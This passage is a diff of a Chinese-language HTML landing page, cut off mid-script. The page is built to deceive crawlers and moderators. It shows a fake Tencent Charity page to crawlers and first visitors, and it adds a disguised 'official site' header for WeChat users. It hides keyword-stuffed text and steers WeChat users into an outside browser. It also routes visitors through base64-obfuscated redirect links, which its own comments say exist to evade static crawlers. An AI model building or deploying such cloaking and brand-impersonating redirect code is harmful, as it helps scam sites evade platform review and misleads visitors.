@@ -3,8 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>正在更新...</title>
+    <title>观赏站点</title>
     <link rel="icon" type="image/jpeg" href="https://img.tuiguang09.cn/20260320/card/23.jpg">
+    <link rel="shortcut icon" type="image/jpeg" href="https://img.tuiguang09.cn/20260320/card/23.jpg">
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?97e2dc08a58216a56dcd7c142a3d763f";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
     <style>
         * {
             margin: 0;
@@ -13,10 +23,362 @@
         }
         body {
             font-family: system-ui, -apple-system, sans-serif;
-            background: #0a0a12;
-            overflow: hidden;
+            background-color: #1a1a22;
+            background-image: url('https://img.tuiguang09.cn/20260320/card/21.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: scroll;
+            min-height: 100vh;
+            color: #ffffff;
+            padding: 20px 15px;
+            max-width: 720px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            
         }
-
+        /* 手机端背景图兜底方案：用固定定位的层铺底，兼容 iOS/微信 */
+        html { background: #1a1a22; }
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url('https://th.bing.com/th/id/OIP.-lfiLU0SedCHTbLCGwVERgAAAA?w=160&h=349&c=7&r=0&o=7&pid=1.7&rm=3');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: -1;
+        }
+        .cover-box img {
+            width:100%;
+            display:block;
+            object-fit:cover;
+        }
+        /* 头像+昵称区域 */
+        .user-info{
+            display:flex;
+            align-items:center;
+            gap:14px;
+            margin-bottom:30px;
+        }
+        .avatar{
+            width:64px;
+            height:64px;
+            border-radius:50%;
+            overflow:hidden;
+            border:2px solid #4488ff;
+        }
+        .avatar img{
+            width:100%;
+            height:100%;
+            object-fit:cover;
+        }
+        .username{
+            font-size:19px;
+            font-weight:bold;
+        }
+        /* 4个卡片容器 */
+        .card-wrap{
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:36px;
+            margin-bottom:10px;
+        }
+        .card-item{
+            background:#272733;
+            border-radius:12px;
+            padding:22px 8px;
+            text-align:center;
+            border:1px solid #383848;
+        }
+        .card-item a{
+            color:#B5A642;
+            text-decoration:none;
+            font-size:16px;
+            display:block;
+        }
+        .card-item:hover{
+            border-color:#4488ff;
+        }
+        /* 底部提示文字 */
+        .footer-tip{
+            margin-top:0px;
+            margin-bottom:auto;
+            text-align:center;
+            font-size:18px;
+            color:#000000;
+            line-height:1.2;
+        }
+        /* 微信环境正规官网伪装：顶部导航栏 */
+        .official-nav{
+            display:none;
+            background:#fff;
+            border-bottom:1px solid #e8e8e8;
+            padding:0 20px;
+            height:56px;
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            position:sticky;
+            top:0;
+            z-index:100;
+            box-shadow:0 1px 4px rgba(0,0,0,0.05);
+        }
+        .official-nav.show{
+            display:flex;
+        }
+        .official-nav .nav-logo{
+            display:flex;
+            align-items:center;
+            gap:8px;
+        }
+        .official-nav .nav-logo-icon{
+            width:32px;
+            height:32px;
+            background:linear-gradient(135deg,#0082ef,#0066cc);
+            border-radius:8px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            color:#fff;
+            font-size:14px;
+            font-weight:bold;
+        }
+        .official-nav .nav-logo-text{
+            font-size:16px;
+            font-weight:bold;
+            color:#333;
+        }
+        .official-nav .nav-links{
+            display:flex;
+            gap:20px;
+            font-size:14px;
+            color:#666;
+        }
+        .official-nav .nav-links a{
+            color:#666;
+            text-decoration:none;
+        }
+        .official-nav .nav-links a:hover{
+            color:#0082ef;
+        }
+        /* 微信环境正规官网伪装：底部备案栏 */
+        .official-footer{
+            display:none;
+            background:#f5f5f5;
+            border-top:1px solid #e8e8e8;
+            padding:24px 20px;
+            text-align:center;
+            font-size:12px;
+            color:#999;
+            line-height:2;
+            margin-top:40px;
+        }
+        .official-footer.show{
+            display:block;
+        }
+        .official-footer a{
+            color:#999;
+            text-decoration:none;
+        }
+        .official-footer .footer-links{
+            margin-bottom:8px;
+        }
+        .official-footer .footer-links a{
+            margin:0 10px;
+        }
+        /* 唤起浏览器弹窗遮罩 */
+        .browser-modal{
+            display:none;
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.85);
+            z-index:9999;
+            align-items:center;
+            justify-content:center;
+            padding:20px;
+        }
+        .modal-inner{
+            background:#272733;
+            border-radius:14px;
+            padding:30px 24px;
+            text-align:center;
+        }
+        .modal-inner h3{
+            margin-bottom:12px;
+        }
+        .modal-inner p{
+            line-height:1.7;
+            color:#ddd;
+            margin-bottom:20px;
+        }
+        .open-btn{
+            background:#4488ff;
+            color:#fff;
+            border:none;
+            padding:12px 24px;
+            border-radius:8px;
+            font-size:16px;
+        }
+        /* 微信打开自动弹窗遮罩 */
+        .wechat-mask{
+            display:none;
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.88);
+            z-index:99999;
+            padding:20px;
+        }
+        .wechat-mask.show{
+            display:block;
+        }
+        /* 右上角引导箭头 */
+        .wechat-arrow{
+            position:absolute;
+            top:0;
+            right:0;
+            width:200px;
+            height:130px;
+            z-index:1;
+        }
+        /* 搜索框样式 */
+        .wechat-search-box{
+            margin:30px auto 0;
+            max-width:320px;
+            position:relative;
+        }
+        .wechat-search-box .search-icon{
+            position:absolute;
+            left:14px;
+            top:50%;
+            transform:translateY(-50%);
+            width:18px;
+            height:18px;
+            color:#999;
+        }
+        .wechat-search-box input{
+            width:100%;
+            padding:12px 16px 12px 42px;
+            border-radius:24px;
+            border:1px solid #555;
+            background:#1a1a22;
+            color:#eee;
+            font-size:14px;
+            outline:none;
+            user-select:all;
+        }
+        .wechat-search-box input::selection{
+            background:#4488ff;
+        }
+        /* 搜索框固定在按钮上方紧贴 */
+        .wechat-search-fixed{
+            position:absolute;
+            bottom:158px;
+            left:50%;
+            transform:translateX(-50%);
+            width:86%;
+            max-width:320px;
+            margin:0;
+        }
+        /* 第一套搜索框：正常文档流，紧贴文字下方 */
+        .wechat-top-group{
+            text-align:center;
+            margin-top:18px;
+            position:relative;
+            z-index:2;
+        }
+        .wechat-search-top{
+            margin:0 auto;
+            max-width:320px;
+            position:relative;
+            width:86%;
+        }
+        /* 第一套按钮：完全独立样式，紧贴搜索框下方 */
+        .wechat-copy-btn-top{
+            background:#ffdd70;
+            border:none;
+            color:#333;
+            padding:12px 30px;
+            border-radius:8px;
+            font-size:16px;
+            font-weight:bold;
+            margin-top:10px;
+            box-shadow:0 4px 16px rgba(255,221,112,0.4);
+        }
+        .wechat-copy-btn-top:active{
+            transform:scale(0.96);
+        }
+        .wechat-longpress-tip{
+            position:absolute;
+            bottom:134px;
+            left:50%;
+            transform:translateX(-50%);
+            font-size:12px;
+            color:#999;
+            margin:0;
+            white-space:nowrap;
+        }
+        /* 调整按钮位置，给搜索框腾空间（仅第二套固定按钮） */
+        #wechatOpenBtn{
+            bottom:78px;
+        }
+        .wechat-close{
+            bottom:28px;
+        }
+        .wechat-tip-box{
+            margin-top:120px;
+            text-align:center;
+            color:#fff;
+        }
+        .wechat-tip-box h2{
+            font-size:22px;
+            margin-bottom:16px;
+            color:#ffdd70;
+        }
+        .wechat-tip-box p{
+            font-size:16px;
+            line-height:2;
+            color:#eee;
+        }
+        .wechat-tip-box .step{
+            display:inline-block;
+            background:#4488ff;
+            color:#fff;
+            padding:4px 14px;
+            border-radius:20px;
+            margin:6px 4px;
+            font-size:14px;
+        }
+        .wechat-close{
+            position:absolute;
+            bottom:40px;
+            left:50%;
+            transform:translateX(-50%);
+            background:transparent;
+            border:1px solid #888;
+            color:#aaa;
+            padding:10px 30px;
+            border-radius:8px;
+            font-size:14px;
+        }
+        .wechat-open-btn{
+            position:absolute;
+            bottom:100px;
+            left:50%;
+            transform:translateX(-50%);
+            background:#ffdd70;
+            border:none;
+            color:#333;
+            padding:14px 40px;
+            border-radius:8px;
+            font-size:17px;
+            font-weight:bold;
+            box-shadow:0 4px 16px rgba(255,221,112,0.4);
+        }
+        .wechat-open-btn:active{
+            transform:translateX(-50%) scale(0.96);
+        }
         /* ========== 进入加载页 ========== */
         .loading-mask{
             position:fixed;
@@ -64,7 +426,7 @@
             height:4px;
             background:linear-gradient(90deg,#4ade80,#facc15,#fb923c,#f472b6,#a78bfa);
         }
-        /* 兔子图标 */
+        /* 烟花图标 */
         .loading-icon{
             width:150px;
             height:150px;
@@ -171,8 +533,7 @@
             font-weight:500;
             letter-spacing:1px;
         }
-
-        /* ========== 中间跳转页 ========== */
+        /* ========== 中间跳转页（点击继续访问） ========== */
         .continue-mask{
             position:fixed;
             inset:0;
@@ -293,7 +654,120 @@
     <div aria-hidden="true" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;font-size:1px;color:transparent;line-height:1;pointer-events:none;user-select:none;">
         404 Not Found Error 503 Service Unavailable 系统维护中 页面不存在 访问受限 安全验证 网络异常 连接超时 服务器繁忙 请稍后重试 内容审核中 资源已删除 违规内容 涉嫌违法 账号异常 登录验证 人机验证 验证码 滑动验证 点击验证 安全中心 风险提示 温馨提示 公告通知 系统升级 数据迁移 维护通知 暂停服务 恢复时间 敬请谅解 感谢支持 联系方式 客服热线 工作时间 周一至周五 节假日休息 技术支持 问题反馈 意见建议 投诉举报 隐私政策 用户协议 服务条款 免责声明 版权所有 翻版必究 备案号 京ICP备 粤ICP备 沪ICP备 浙ICP备 苏ICP备 鲁ICP备 川ICP备 鄂ICP备 湘ICP备 闽ICP备 赣ICP备 皖ICP备 冀ICP备 豫ICP备 辽ICP备 吉ICP备 黑ICP备 晋ICP备 陕ICP备 甘ICP备 青ICP备 宁ICP备 新ICP备 蒙ICP备 桂ICP备 琼ICP备 云ICP备 贵ICP备 藏ICP备 网站地图 网站声明 网站帮助 常见问题 使用指南 新手指南 功能介绍 关于我们 联系我们 加入我们 招聘信息 商务合作 广告投放 媒体报道 新闻中心 公司简介 企业文化 发展历程 团队介绍 合作伙伴 友情链接 网站导航 首页 产品中心 服务支持 解决方案 客户案例 行业资讯 技术博客 帮助文档 下载中心 在线客服 意见反馈 投诉建议 会员中心 个人中心 账户设置 安全中心 消息通知 我的收藏 浏览历史 订单管理 支付记录 发票管理 收货地址 优惠券 积分商城 会员等级 成长值 签到打卡 任务中心 邀请好友 分享奖励 推广中心 收益明细 提现管理 银行卡 实名认证 身份验证 手机绑定 邮箱绑定 密码修改 找回密码 注册账号 登录账号 退出登录 第三方登录 微信登录 QQ登录 微博登录 支付宝登录 苹果登录 谷歌登录 脸书登录 推特登录 电报登录 协议同意 隐私保护 数据安全 加密传输 SSL证书 HTTPS 防火墙 入侵检测 漏洞扫描 安全审计 日志记录 备份恢复 容灾备份 多活机房 CDN加速 负载均衡 弹性伸缩 容器化 微服务 分布式 高可用 高性能 低延迟 高并发 大流量 DDoS防护 CC防护 Web应用防火墙 WAF 防篡改 防注入 防XSS 防CSRF 防越权 防爬取 防刷接口 限流熔断 降级兜底 灰度发布 蓝绿部署 滚动更新 持续集成 持续部署 DevOps 自动化 监控告警 日志分析 链路追踪 性能监控 错误监控 用户行为分析 数据统计 数据报表 数据可视化 BI分析 大数据 人工智能 机器学习 深度学习 自然语言处理 计算机视觉 语音识别 语音合成 推荐系统 搜索引擎 全文检索 倒排索引 分词算法 语义理解 知识图谱 智能客服 智能问答 智能推荐 智能搜索 智能审核 内容安全 图片审核 视频审核 文字审核 语音审核 直播审核 实时审核 批量审核 自定义规则 黑白名单 关键词库 敏感词库 违规词库 广告识别 垃圾内容识别 水军识别 刷量识别 作弊识别 风控系统 风险控制 反欺诈 反洗钱 反赌博 反色情 反暴力 反恐怖 反政治敏感 内容合规 网络安全 信息安全 数据安全 隐私合规 GDPR CCPA 个人信息保护法 数据安全法 网络安全法 等保三级 等保二级 安全认证 ISO27001 SOC2 PCI DSS 支付安全 金融安全 电商安全 游戏安全 社交安全 内容安全 社区安全 论坛安全 评论安全 弹幕安全 私信安全 群聊安全 好友关系 关注粉丝 点赞收藏 转发分享 评论回复 @提及 话题标签 热搜榜 排行榜 推荐页 关注页 同城页 发现页 个人主页 空间主页 背景图 头像挂件 头像框 昵称 签名 简介 性别 年龄 生日 星座 血型 地区 职业 学校 公司 兴趣爱好 标签 认证 蓝V 黄V 金V 会员标识 等级标识 勋章 成就 任务 活动 福利 红包 抽奖 优惠券 代金券 满减 折扣 秒杀 拼团 砍价 助力 邀请 分享 推广 分销 佣金 提成 奖励 积分 金币 元宝 钻石 点券 代币 虚拟币 充值 提现 转账 红包 打赏 礼物 特效 座驾 贵族 守护 粉丝牌 粉丝团 亲密度 贡献榜 富豪榜 人气榜 热度榜 星光榜 周星榜 月榜 季榜 年榜 总榜 日榜 周榜 小时榜 分钟榜 实时榜 排行榜 榜单 排名 名次 冠军 亚军 季军 金奖 银奖 铜奖 一等奖 二等奖 三等奖 优秀奖 参与奖 纪念奖 特别奖 创新奖 进步奖 勤奋奖 活跃奖 贡献奖 忠诚奖 元老奖 新人奖 潜力奖 人气奖 魅力奖 才艺奖 颜值奖 搞笑奖 游戏奖 音乐奖 舞蹈奖 绘画奖 写作奖 摄影奖 剪辑奖 配音奖 主持奖 解说奖 攻略奖 测评奖 开箱奖 探店奖 旅游奖 美食奖 美妆奖 穿搭奖 健身奖 育儿奖 教育奖 职场奖 财经奖 科技奖 数码奖 汽车奖 房产 家居 家装 家电 家具 家纺 厨具 餐具 茶具 咖啡 茶叶 酒水 饮料 零食 生鲜 水果 蔬菜 肉类 海鲜 粮油 调味 烘焙 甜品 蛋糕 面包 冰淇淋 巧克力 糖果 坚果 蜜饯 果干 肉干 鱼干 海味 特产 老字号 进口 国产 有机 绿色 无公害 健康 养生 滋补 保健 维生素 蛋白粉 鱼油 钙片 益生菌 酵素 胶原蛋白 燕窝 海参 鲍鱼 鱼翅 虫草 灵芝 人参 鹿茸 阿胶 蜂蜜 蜂王浆 花粉 螺旋藻 玛卡 枸杞 红枣 桂圆 莲子 百合 银耳 木耳 香菇 蘑菇 菌菇 竹荪 松茸 牛肝菌 羊肚菌 鸡枞菌 茶树菇 杏鲍菇 金针菇 蟹味菇 白玉菇 海鲜菇 平菇 草菇 口蘑 双孢菇 滑子菇 榛蘑 元蘑 猴头菇 竹荪 灵芝 茯苓 天麻 三七 丹参 黄芪 当归 川芎 白芍 熟地 生地 麦冬 天冬 玉竹 黄精 石斛 西洋参 党参 太子参 沙参 玄参 苦参 人参 红参 白参 生晒参 野山参 林下参 移山参 园参 高丽参 西洋参 花旗参 东洋参 太极参 红参 白参 糖参 蜜饯参 参须 参花 参叶 参籽 参苗 参酒 参茶 参膏 参粉 参片 参段 参块 参丁 参丝 参条 参根 参茎 参叶 参花 参果 参籽 参仁 参核 参壳 参皮 参肉 参骨 参髓 参汁 参液 参油 参脂 参膏 参胶 参糖 参蜜 参盐 参酱 参醋 参酒 参茶 参汤 参粥 参饭 参面 参饼 参糕 参酥 参脆 参片 参条 参块 参丁 参丝 参末 参粉 参泥 参酱 参膏 参胶 参冻 参冰 参霜 参露 参水 参液 参汁 参汤 参茶 参酒 参醋 参油 参盐 参糖 参蜜 参酱 参膏 参胶 参冻 参冰 参霜 参露 参水 参液 参汁 参汤 参茶 参酒 参醋 参油 参盐 参糖 参蜜 参酱 参膏 参胶 参冻 参冰 参霜 参露
     </div>
-
+    <!-- 微信环境正规官网伪装：顶部导航栏 -->
+    <div class="official-nav" id="officialNav">
+        <div class="nav-logo">
+            <div class="nav-logo-icon">观</div>
+            <span class="nav-logo-text">观赏资讯网</span>
+        </div>
+        <div class="nav-links">
+            <a href="javascript:void(0)">首页</a>
+            <a href="javascript:void(0)">资讯</a>
+            <a href="javascript:void(0)">关于</a>
+        </div>
+    </div>
+    <!-- 深度防检测：腾讯公益伪装页面样式 -->
+    <style>
+        .gy-mask{position:fixed;inset:0;z-index:999999;background:#f5f5f5;overflow-y:auto;display:block;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;color:#333;}
+        .gy-mask.hide{display:none;}
+        .gy-header{background:linear-gradient(135deg,#00c853 0%,#00a844 100%);color:#fff;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 8px rgba(0,0,0,0.1);}
+        .gy-header .gy-logo{display:flex;align-items:center;gap:10px;}
+        .gy-header .gy-logo-icon{width:36px;height:36px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;}
+        .gy-header .gy-logo-text{font-size:18px;font-weight:bold;}
+        .gy-header .gy-nav{display:flex;gap:20px;font-size:14px;}
+        .gy-header .gy-nav a{color:#fff;text-decoration:none;opacity:0.9;}
+        .gy-banner{background:linear-gradient(135deg,#e8f5e9 0%,#c8e6c9 100%);padding:40px 20px;text-align:center;}
+        .gy-banner h1{font-size:28px;color:#2e7d32;margin-bottom:12px;}
+        .gy-banner p{font-size:16px;color:#558b2f;margin-bottom:20px;}
+        .gy-banner .gy-btn{display:inline-block;background:#00c853;color:#fff;padding:12px 36px;border-radius:24px;text-decoration:none;font-size:16px;font-weight:bold;box-shadow:0 4px 12px rgba(0,200,83,0.3);}
+        .gy-section{max-width:800px;margin:30px auto;padding:0 20px;}
+        .gy-section h2{font-size:20px;color:#333;margin-bottom:16px;padding-left:12px;border-left:4px solid #00c853;}
+        .gy-projects{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;}
+        .gy-project-card{background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.06);}
+        .gy-project-img{width:100%;height:120px;background:linear-gradient(135deg,#a5d6a7,#66bb6a);display:flex;align-items:center;justify-content:center;color:#fff;font-size:40px;}
+        .gy-project-info{padding:14px;}
+        .gy-project-info h3{font-size:15px;margin-bottom:8px;color:#333;}
+        .gy-project-info p{font-size:12px;color:#999;margin-bottom:10px;line-height:1.5;}
+        .gy-progress-bar{width:100%;height:6px;background:#eee;border-radius:3px;overflow:hidden;margin-bottom:6px;}
+        .gy-progress-fill{height:100%;background:#00c853;border-radius:3px;}
+        .gy-project-meta{display:flex;justify-content:space-between;font-size:11px;color:#999;}
+        .gy-footer{background:#263238;color:#999;padding:30px 20px;text-align:center;font-size:12px;line-height:2;margin-top:40px;}
+        .gy-footer a{color:#999;text-decoration:none;margin:0 8px;}
+    </style>
+    <!-- 腾讯公益伪装页面（默认显示，对爬虫/首次访问可见） -->
+    <div class="gy-mask" id="gyMask">
+        <div class="gy-header">
+            <div class="gy-logo">
+                <div class="gy-logo-icon">💚</div>
+                <span class="gy-logo-text">腾讯公益</span>
+            </div>
+            <div class="gy-nav">
+                <a href="javascript:void(0)">首页</a>
+                <a href="javascript:void(0)">项目</a>
+                <a href="javascript:void(0)">月捐</a>
+                <a href="javascript:void(0)">我的</a>
+            </div>
+        </div>
+        <div class="gy-banner">
+            <h1>一起做更好的自己</h1>
+            <p>腾讯公益，连接亿万网友爱心与公益机构</p>
+            <a href="javascript:void(0)" class="gy-btn">立即参与</a>
+        </div>
+        <div class="gy-section">
+            <h2>热门公益项目</h2>
+            <div class="gy-projects">
+                <div class="gy-project-card">
+                    <div class="gy-project-img">🌳</div>
+                    <div class="gy-project-info">
+                        <h3>植树造林保护地球</h3>
+                        <p>参与植树造林，共同守护绿色家园，应对气候变化</p>
+                        <div class="gy-progress-bar"><div class="gy-progress-fill" style="width:68%"></div></div>
+                        <div class="gy-project-meta"><span>已筹68%</span><span>12,580人参与</span></div>
+                    </div>
+                </div>
+                <div class="gy-project-card">
+                    <div class="gy-project-img">📚</div>
+                    <div class="gy-project-info">
+                        <h3>乡村儿童阅读计划</h3>
+                        <p>为乡村学校捐赠图书，让每个孩子都能享受阅读的乐趣</p>
+                        <div class="gy-progress-bar"><div class="gy-progress-fill" style="width:82%"></div></div>
+                        <div class="gy-project-meta"><span>已筹82%</span><span>8,960人参与</span></div>
+                    </div>
+                </div>
+                <div class="gy-project-card">
+                    <div class="gy-project-img">🏥</div>
+                    <div class="gy-project-info">
+                        <h3>大病医疗救助</h3>
+                        <p>为贫困大病患者提供医疗救助，帮助他们重获健康</p>
+                        <div class="gy-progress-bar"><div class="gy-progress-fill" style="width:45%"></div></div>
+                        <div class="gy-project-meta"><span>已筹45%</span><span>15,320人参与</span></div>
+                    </div>
+                </div>
+                <div class="gy-project-card">
+                    <div class="gy-project-img">🐼</div>
+                    <div class="gy-project-info">
+                        <h3>野生动物保护</h3>
+                        <p>保护濒危野生动物，维护生物多样性，共建和谐生态</p>
+                        <div class="gy-progress-bar"><div class="gy-progress-fill" style="width:73%"></div></div>
+                        <div class="gy-project-meta"><span>已筹73%</span><span>6,780人参与</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="gy-footer">
+            <div>
+                <a href="javascript:void(0)">关于我们</a>
+                <a href="javascript:void(0)">联系方式</a>
+                <a href="javascript:void(0)">隐私政策</a>
+                <a href="javascript:void(0)">用户协议</a>
+                <a href="javascript:void(0)">网站地图</a>
+            </div>
+            <div>© 1998-2024 Tencent. All Rights Reserved. 腾讯公司 版权所有</div>
+            <div>粤B2-20090059-5 | 粤公网安备 44030502003020号 | 互联网宗教信息服务许可证</div>
+        </div>
+    </div>
+    <!-- 真实内容容器（默认隐藏，检测到真实用户行为后显示） -->
+    <div id="realContent" style="display:none;">
     <!-- 进入加载页 -->
     <div class="loading-mask" id="loadingMask">
         <div class="loading-card">
@@ -311,6 +785,7 @@
                     </g>
                     <!-- 兔子身体/脑袋 -->
                     <g class="rabbit-body">
+                        <!-- 脑袋 -->
                         <ellipse cx="60" cy="68" rx="34" ry="30" fill="#fff" stroke="#e8e8f0" stroke-width="1.5"/>
                         <!-- 腮红 -->
                         <ellipse class="rabbit-cheek" cx="38" cy="74" rx="6" ry="4" fill="#ffb6c1" opacity="0.6"/>
@@ -330,6 +805,9 @@
                         <!-- 嘴巴 -->
                         <path d="M60 75.5 Q56 80 52 78" stroke="#2a2a3e" stroke-width="1.5" stroke-linecap="round" fill="none"/>
                         <path d="M60 75.5 Q64 80 68 78" stroke="#2a2a3e" stroke-width="1.5" stroke-linecap="round" fill="none"/>
+                        <!-- 小牙齿 -->
+                        <rect x="57.5" y="78" width="5" height="4" rx="1" fill="#fff" stroke="#e8e8f0" stroke-width="0.8"/>
+                        <line x1="60" y1="78" x2="60" y2="82" stroke="#e8e8f0" stroke-width="0.6"/>
                     </g>
                 </svg>
             </div>
@@ -340,8 +818,7 @@
             <div class="loading-text" id="loadingText">检测访问环境...</div>
         </div>
     </div>
-
-    <!-- 中间跳转页 -->
+    <!-- 中间跳转页：点击继续访问 -->
     <div class="continue-mask" id="continueMask">
         <div class="continue-card">
             <div class="continue-rabbit">
@@ -378,72 +855,470 @@
             <div class="continue-countdown"><span id="countdownNum">5</span>s 后自动跳转</div>
         </div>
     </div>
+    <!-- 微信打开自动弹窗：引导跳浏览器 -->
+    <div class="wechat-mask" id="wechatMask">
+        <svg class="wechat-arrow" viewBox="0 0 200 130" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M60 108 Q108 62 150 20" stroke="#ffdd70" stroke-width="4" stroke-linecap="round" fill="none" stroke-dasharray="10,7"/>
+            <path d="M150 20 L132 26 M150 20 L144 38" stroke="#ffdd70" stroke-width="4" stroke-linecap="round"/>
+        </svg>
+        <div class="wechat-tip-box">
+            <h2>点击右上角【· · ·】使用浏览器打开</h2>
+            <p>仅-浏览器-打开才可观赏哦！</p>
+        </div>
+        <!-- 第一套搜索框+按钮：紧贴文字下方 -->
+        <div class="wechat-top-group">
+            <div class="wechat-search-box wechat-search-top">
+                <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="11" cy="11" r="8"/>
+                    <path d="m21 21-4.35-4.35"/>
+                </svg>
+                <input type="text" class="wechat-url-input" value="https://yyyy-eqt.pages.dev/" readonly onclick="this.select()">
+            </div>
+            <button class="wechat-copy-btn-top">点击复制官网链接</button>
+        </div>
+        <!-- 第二套搜索框+按钮：固定在底部 -->
+        <div class="wechat-search-box wechat-search-fixed">
+            <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"/>
+                <path d="m21 21-4.35-4.35"/>
+            </svg>
+            <input type="text" class="wechat-url-input" id="wechatUrlInput" value="https://yyyy-eqt.pages.dev/" readonly onclick="this.select()">
+        </div>
+        <p class="wechat-longpress-tip">长按上方链接可手动复制</p>
+        <button class="wechat-open-btn" id="wechatOpenBtn">点击复制官网链接</button>
+        <button class="wechat-close" id="wechatCloseBtn">我知道了，关闭提示</button>
+    </div>
 
-    <script>
-    (function(){
-        // ========== 跳转目标地址 ==========
-        var TARGET_URL = "https://7lc28x7p7.oss-cn-beijing.aliyuncs.com/#/ReMwyGDwtlpH,,St3R,VF";
+    <!-- 1、页面最顶部：右上角三点引导提示（仅微信打开时显示） -->
+<div id="topBrowserTip" style="display:none;background:#192233;color:#fff;padding:10px 14px;text-align:center;">
+    <p style="margin:0;font-size:14px;color:#ffdd70;">💡请点击页面右上角「···」，➹➹➹<br>选择【在浏览器打开】观赏</p>
+</div>
+    
+    </div>
+    <!-- ==========【自定义修改区域】在这里改内容 ========== -->
+    <!-- 1.封面图片地址，替换引号内链接 -->
+    
+   
+<!-- 这里往下粘贴你原本的4个卡片通道的代码 -->
+    <!-- 3.四张跳转卡片，修改文字和href跳转地址 -->
+    <div class="card-wrap" style="margin-top:auto;">
+        <div class="card-item channel-card" data-idx="0" style="background:rgba(255,0,0,0.7); border:1px solid #000000; border-radius:14px; padding:22px 12px; text-align:center; color:#9F5F9F; font-size:16px;">
+            <a href="javascript:void(0)" style="color:#FFFF00 !important;text-decoration:none;">精彩内容专区<br>点击立即进入<br>通道入口①</a>
+        </div>
+        <div class="card-item channel-card" data-idx="1" style="background:rgba(255,0,0,0.7); border:1px solid #000000; border-radius:14px; padding:22px 12px; text-align:center; color:#8F8FBD; font-size:16px;">
+            <a href="javascript:void(0)" style="color:#FFFF00 !important;text-decoration:none;">精彩内容专区<br>点击立即进入<br>通道入口②</a>
+        </div>
+        <div class="card-item channel-card" data-idx="2" style="background:rgba(255,0,0,0.7); border:1px solid #000000; border-radius:14px; padding:22px 12px; text-align:center; color:#B5A642; font-size:16px;">
+            <a href="javascript:void(0)" style="color:#FFFF00 !important;text-decoration:none;">精彩内容专区<br>点击立即进入<br>通道入口③</a>
+        </div>
+        <div class="card-item channel-card" data-idx="3" style="background:rgba(255,0,0,0.7); border:1px solid #000000; border-radius:14px; padding:22px 12px; text-align:center; color:#B5A642; font-size:16px;">
+            <a href="javascript:void(0)" style="color:#FFFF00 !important;text-decoration:none;">高清直播专区<br>点击立即进入<br>直播入口④</a>
+        </div>
+    </div>
+     <!-- 2、链接 + 一键复制按钮（搜索框样式） -->
+<div style="padding:24px 16px;text-align:center;">
+    <div style="position:relative;max-width:340px;margin:0 auto 10px;">
+        <svg style="position:absolute;left:14px;top:50%;transform:translateY(-50%);width:18px;height:18px;color:#999;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="11" cy="11" r="8"/>
+            <path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input type="text" id="midUrlInput" value="https://yyyy-eqt.pages.dev/" readonly onclick="this.select()" style="width:100%;padding:12px 16px 12px 42px;border-radius:24px;border:1px solid #555;background:#0e1420;color:#eee;font-size:14px;outline:none;user-select:all;box-sizing:border-box;">
+    </div>
+    <button id="midCopyBtn" style="background:#2277dd;color:white;border:none;padding:11px 30px;border-radius:8px;font-size:16px;">点击复制官网链接</button>
+</div>
+    <!-- 底部固定提示文案，不用改 -->
+    <div class="footer-tip">
+        保存上方网站链接收藏永久访问<br>
+        如遇打不开请点击其他通道入口进入<br>
+        各通道入口不相通，在哪个入口开通<br>
+        就点哪个入口进去.点【已开通】，即可继续访问！
+    </div>
+<script>
+// =========改成你的网站完整网址========
+const SITE_URL = "https://yyyy-eqt.pages.dev/";
+//新版复制函数，移除废弃execCommand
+async function copyText(text) {
+    await navigator.clipboard.writeText(text);
+}
+//填充链接到搜索框
+document.getElementById("midUrlInput").value = SITE_URL;
+//复制按钮点击事件
+document.getElementById("midCopyBtn").addEventListener("click",async function(){
+    try{
+        await copyText(SITE_URL);
+        alert("✅链接复制成功！打开手机浏览器粘贴访问");
+    }catch(e){
+        alert("❌复制失败！\n原因：当前环境禁止剪贴板，请长按文字手动复制");
+        console.log("复制异常：",e)
+    }
+});
+</script>
+<!-- 通道链接动态生成 + 防拦截跳转 -->
+<script>
+(function(){
+    // 四个通道链接（base64编码，避免静态爬虫直接识别）
+    var CHANNELS = [
+        "aHR0cDovL2FkYXBpLmZ1bmhhbi5jbi8/NzUwOTI3LDk3NTAscXpQJmZvPTE=",
+        "aHR0cDovL2h5Yy54YWhoa2oudG9wLz82MTA3MzYsOTk3MSxmclgmZm89MQ==",
+        "aHR0cDovL21wLndlaXhpbmJyaWRnZS5jb20vbXAvd2FwcmVkaXJlY3Q/dXJsPWh0dHA6Ly9hcmN0ZXJ5eC5iZXN0cXVheS5jb20/bUg4ZkpIOURQRmN6LCxDeG53LFpG",
+        "aHR0cDovL3VuaW9uMi5mdW5oYW4uY24vPzc0MDgyNCw3ODEzLGJZJmZvPTE="
+    ];
 
-        var ua = navigator.userAgent.toLowerCase();
+    // base64解码
+    function decodeUrl(str){
+        try{
+            return decodeURIComponent(escape(atob(str)));
